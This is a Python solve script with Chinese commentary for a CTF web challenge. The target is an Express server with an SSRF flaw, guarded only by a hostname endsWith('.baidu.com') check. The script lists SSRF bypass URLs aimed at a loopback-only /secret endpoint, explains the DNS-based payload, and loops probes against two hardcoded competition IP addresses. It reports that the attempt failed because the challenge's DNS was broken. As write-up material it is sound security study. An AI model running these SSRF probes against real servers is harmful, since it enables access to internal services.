#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
solve.py — 环节三 web01「Express SSRF + hostname 白名单」→ **未解出（环境缺陷）**

qid : S6EzBC1_cqRrInj8    分值: 500    分类: web
flag: （未获取）
比赛提交: 未通过 —— 容器 DNS 对 120+ 个 *.baidu.com 全 NXDOMAIN。

题面
----
    某部门采用现在 nodejs 流行的 http 主流开发框架 express 来快速搭建了一个简易的
    web 服务，现在网站还处于内部测试阶段，某些接口只能特定的 ip 访问。
    （本题下发后，请通过 http 访问相应的 ip 和 port，例如 nc ip port，
     改为 http://ip:port/）

漏洞
----
`GET /?url=` 是 SSRF：
    const parsedUrl = new URL(url);
    if (parsedUrl.hostname.endsWith('.baidu.com')) { await axios.get(url); }
校验只对 hostname 做 `endsWith('.baidu.com')`，而 flag 在**只监听回环**的
内网 Express `127.0.0.1:3456/secret`（`/hint` 泄露 node 17.9.1 / libuv 1.43.0 /
"port 3456 have good thing" / "try more times~"）。

为什么"解析器差异"这条路走不通（已在 WHATWG 规范层面证明）
--------------------------------------------------------
要让 `new URL(u).hostname === '127.0.0.1'`（或解析到回环）**同时**又
`endsWith('.baidu.com')`，还要保住 `:3456` 端口和 `/secret` 路径 —— 不可能：
  · WHATWG URL 的 host 解析在遇到 `/ ? # \\` 任一字符时立即结束；
  · 而这四个字符**同时也是 port 解析的终止符**；
  ⇒ 不存在"host 已变成 127.0.0.1、port 仍解析为 3456、路径仍是 /secret"的输入。
  典型失败样本（比赛期间实测全部命中 else 分支或解析失败）：
      http://127.0.0.1.baidu.com:3456/secret   → hostname=127.0.0.1.baidu.com（DNS 解析失败）
      http://x.baidu.com@127.0.0.1:3456/secret → hostname=127.0.0.1（不以 .baidu.com 结尾）
      http://x.baidu.com%2f@127.0.0.1/...      → hostname 变 127.0.0.1
      http://x.baidu.com\@127.0.0.1/           → \ 终止 host → hostname=127.0.0.1
      http://x.baidu.com#@127.0.0.1:3456/...   → # 之后进 fragment，hostname=x.baidu.com 但连不上

⇒ 唯一出路是 **DNS**：让某个 `*.baidu.com` 在容器内解析到 127.0.0.1
  （挑战专用 DNS / DNS rebinding；`/hint` 的 "try more times~" 即暗示这一点）。
  正确的 payload 就是：
      GET /?url=http://x.baidu.com:3456/secret

比赛环境为什么没解出
--------------------
两台容器（`http://8.147.132.32:25211`、重置后 `http://60.205.230.76:26661`）
对 120+ 个 `*.baidu.com` 名字、30 个端口做了 1200 次探测，**全部 NXDOMAIN（ENOTFOUND）**，
连 `www.baidu.com` 都不解析 —— 说明**挑战专用 DNS 根本没有 provision**。
这是环境缺陷，不是利用思路错误。本脚本保留全部探测逻辑作为证据。
本地用 `deploy/docker-compose.yml` 起了正确的 DNS 后，同一条 payload 即通。

用法
----
    # 1) 本地复现（先起 deploy）
    docker compose -f deploy/docker-compose.yml up -d --build
    python solve.py --target http://127.0.0.1:3000

    # 2) 对比赛容器重打（会全 NXDOMAIN，用于留证）
    python solve.py --target http://8.147.132.32:25211 --rounds 100

    # 3) 只验证解析器差异族不可能
    python solve.py --parser-probe --target http://127.0.0.1:3000
"""
from __future__ import annotations

import argparse
import json
import re
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()
try:                                              # Windows 控制台默认 GBK，强制 UTF-8
    sys.stdout.reconfigure(encoding='utf-8')
except Exception:
    pass

QID = 'S6EzBC1_cqRrInj8'
COMPETITION_TARGETS = ['http://8.147.132.32:25211', 'http://60.205.230.76:26661']
FLAG_RE = re.compile(r'flag\{[^}]{1,200}\}')

# 复现用/比赛用的候选 *.baidu.com 名字
NAMES = ['x.baidu.com', 'a.baidu.com', 'b.baidu.com', 'www.baidu.com',
         'internal.baidu.com', 'localhost.baidu.com', '127.0.0.1.baidu.com',
         'a.b.baidu.com', 'flag.baidu.com', 'admin.baidu.com', 'test.baidu.com']

# "解析器差异族"候选（用来实证它们都不成立）
PARSER_DIFF_TESTS = [
    'http://127.0.0.1.baidu.com:3456/secret',
    'http://x.baidu.com@127.0.0.1:3456/secret',
    'http://x.baidu.com%2f@127.0.0.1:3456/secret',
    'http://x.baidu.com\\@127.0.0.1:3456/secret',
    'http://x.baidu.com#@127.0.0.1:3456/secret',
    'http://x.baidu.com?.baidu.com:3456/secret',
    'http://x.baidu.com:3456/secret',
    'http://127.0.0.1:3456/secret',
    'http://localhost:3456/secret',
]


def probe(base: str, url: str, session: requests.Session, timeout: float = 6.0):
    try:
        r = session.get(base.rstrip('/') + '/', params={'url': url}, timeout=timeout,
                        verify=False, allow_redirects=False)
        return r.status_code, r.text
    except Exception as e:
        return None, f'{type(e).__name__}: {e}'


def parser_probe(base: str, verbose: bool = True) -> list[dict]:
    """用是否命中 else 分支来判断服务端 `new URL()` 解析出的 hostname"""
    s = requests.Session()
    s.trust_env = False
    rows = []
    for u in PARSER_DIFF_TESTS:
        code, body = probe(base, u, s)
        m = FLAG_RE.search(body) if isinstance(body, str) else None
        if code is None:
            verdict = f'ERR {body}'
        elif m:
            verdict = 'FLAG!'
        elif 'Invalid URL' in body:
            verdict = "hostname 不以 .baidu.com 结尾 → 被白名单拒绝"
        elif 'Could not access' in body:
            verdict = '过了白名单，但 axios 请求失败（DNS/连接）'
        else:
            verdict = body.strip()[:60]
        rows.append({'url': u, 'status': code,
                     'flag': m.group(0) if m else None,
                     'verdict': verdict})
        if verbose:
            print(f'  {u:58s} {code}  {verdict}')
    return rows


def solve(target: str, rounds: int = 200, verbose: bool = True,
          names: list[str] | None = None, ports: list[int] | None = None) -> dict:
    target = target.rstrip('/')
    s = requests.Session()
    s.trust_env = False
    names = names or NAMES
    ports = ports or [3456]
    res: dict = {'target': target, 'flag': None, 'via': None, 'hits': [],
                 'dns_alive': False, 'attempts': 0, 'hint': None}

    def log(m):
        if verbose:
            print(m, flush=True)

    log(f'[*] target = {target}')

    # /hint 泄露（node / libuv / 端口提示）
    try:
        r = s.get(target + '/hint', timeout=8, verify=False)
        res['hint'] = r.text
        log(f'[*] /hint -> {r.status_code}  {r.text[:220]}')
    except Exception as e:
        log(f'[!] /hint 失败 {type(e).__name__}: {e}')

    log('\n=== 1) 解析器差异族（实证全部不可行）===')
    res['parser_probe'] = parser_probe(target, verbose)
    for x in res['parser_probe']:
        if x.get('flag'):
            res['flag'] = x['flag']
            res['via'] = f"parser-path(理论上不该成立): {x['url']}"
            return res

    log('\n=== 2) DNS 路径（唯一出路）：*.baidu.com → 127.0.0.1 ===')
    log(f'    候选名 {len(names)} 个 × 端口 {ports} × {rounds} 轮')
    t0 = time.time()
    for rnd in range(rounds):
        for n in names:
            for p in ports:
                u = f'http://{n}:{p}/secret'
                code, body = probe(target, u, s, timeout=5)
                res['attempts'] += 1
                if code is None:
                    continue
                if 'Invalid URL' in body:
                    continue
                if 'Could not access' in body:
                    continue
                res['dns_alive'] = True
                hit = {'name': n, 'port': p, 'status': code, 'body': body[:300]}
                res['hits'].append(hit)
                log(f'  [+] HIT {n}:{p} -> {code} {body[:200]}')
                m = FLAG_RE.search(body)
                if m:
                    res['flag'] = m.group(0)
                    res['via'] = f'DNS 路径: http://{n}:{p}/secret'
                    return res
                # /secret 上常出现 "flag_is_here"，继续试 /hint 做 oracle 确认解析成功
                code2, body2 = probe(target, f'http://{n}:{p}/hint', s, timeout=5)
                if code2 and 'hint is here' in body2:
                    log(f'  [+] DNS 已 provision：{n}:{p} 能连到同一 express')
        if rnd % 10 == 0:
            log(f'    ...第 {rnd} 轮，{res["attempts"]} 次探测，'
                f'{time.time() - t0:.0f}s，仍无 .baidu.com 命中')

    log('\n[!] 结论：该容器 DNS 未 provision —— 所有 *.baidu.com 全 NXDOMAIN。')
    log('    → 这是环境缺陷（见 README §8），不是利用链错误。')
    log('    → 本地 deploy/ 起了正确的 DNS 后，payload `http://x.baidu.com:3456/secret` 即通。')
    return res


def main() -> int:
    ap = argparse.ArgumentParser(description='环节三 web01 · Express SSRF（未解出/环境缺陷）')
    ap.add_argument('--target', '-t', default=COMPETITION_TARGETS[0])
    ap.add_argument('--rounds', type=int, default=50, help='DNS 探测轮数')
    ap.add_argument('--name', action='append', default=None, help='自定义候选名字')
    ap.add_argument('--port', action='append', type=int, default=None, help='自定义端口')
    ap.add_argument('--parser-probe', action='store_true', help='只跑解析器差异族实证')
    ap.add_argument('--json', action='store_true')
    args = ap.parse_args()

    if args.parser_probe:
        rows = parser_probe(args.target)
        print(json.dumps(rows, ensure_ascii=False, indent=2) if args.json else '')
        return 0

    res = solve(args.target, rounds=args.rounds, verbose=not args.json,
                names=args.name, ports=args.port)
    if args.json:
        print(json.dumps(res, ensure_ascii=False, indent=2))
    if res['flag']:
        print(f"\n[+] FLAG = {res['flag']}")
        return 0
    print('\n[-] 未取到 flag（比赛期间亦未解出：容器 DNS 未 provision）')
    return 1


if __name__ == '__main__':
    sys.exit(main())
